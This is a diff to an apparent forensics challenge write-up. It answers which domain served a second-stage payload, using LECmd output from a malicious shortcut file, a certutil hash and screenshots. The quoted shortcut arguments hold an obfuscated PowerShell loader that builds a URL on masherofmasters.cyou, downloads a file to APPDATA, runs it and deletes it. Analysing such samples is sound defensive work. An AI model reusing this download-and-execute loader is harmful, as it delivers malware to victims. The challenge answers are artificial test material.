@@ -42,6 +42,44 @@ telegram
 
 ***3. What domain did the attacker use to download the second stage of the malware?***
 
+masherofmasters.cyou
+
+![image](https://github.com/user-attachments/assets/63bd4db8-6ac7-4f51-b051-c843fc46905d)
+
+lecmd.exe -f templet.lnk
+
+![image](https://github.com/user-attachments/assets/e8d8a357-e98e-4382-a054-f15be12b63e1)
+
+```
+Relative Path: ..\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Arguments: -ExecutionPolicy UnRestricted $ProgressPreference = 0;
+function nvRClWiAJT($OnUPXhNfGyEh){$OnUPXhNfGyEh[$OnUPXhNfGyEh.Length..0] -join('')};
+function sDjLksFILdkrdR($OnUPXhNfGyEh){
+$vecsWHuXBHu = nvRClWiAJT $OnUPXhNfGyEh;
+for($TJuYrHOorcZu = 0;$TJuYrHOorcZu -lt $vecsWHuXBHu.Length;$TJuYrHOorcZu += 2){
+try{$zRavFAQNJqOVxb += nvRClWiAJT $vecsWHuXBHu.Substring($TJuYrHOorcZu,2)}
+catch{$zRavFAQNJqOVxb += $vecsWHuXBHu.Substring($TJuYrHOorcZu,1)}};$zRavFAQNJqOVxb};
+$NpzibtULgyi = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';
+$cDkdhkGBtl = $env:APPDATA + '\' + ($NpzibtULgyi -split '/')[-1];
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+$wbpiCTsGYi = wget $NpzibtULgyi -UseBasicParsing;
+[IO.File]::WriteAllText($cDkdhkGBtl, $wbpiCTsGYi);
+& $cDkdhkGBtl;
+sleep 3;
+rm $cDkdhkGBtl;
+Icon Location: C:\Windows\System32\imageres.dll
+```
+
+certutil -hashfile templet.lnk
+
+![image](https://github.com/user-attachments/assets/d54c5405-fb24-4238-a75b-e59f122b2bdc)
+
+8b49368462651afa265273151a1e7d4ea19e6347
+
+![image](https://github.com/user-attachments/assets/f248f584-9520-4fd4-bc8d-371d1f3e4938)
+
+masherofmasters.cyou
+
 ***4. What is the name of the command that the attacker injected using one of the installed LOLAPPS on the machine to achieve persistence?***
 
 ***5. What is the complete path of the malicious file that the attacker used to achieve persistence?***
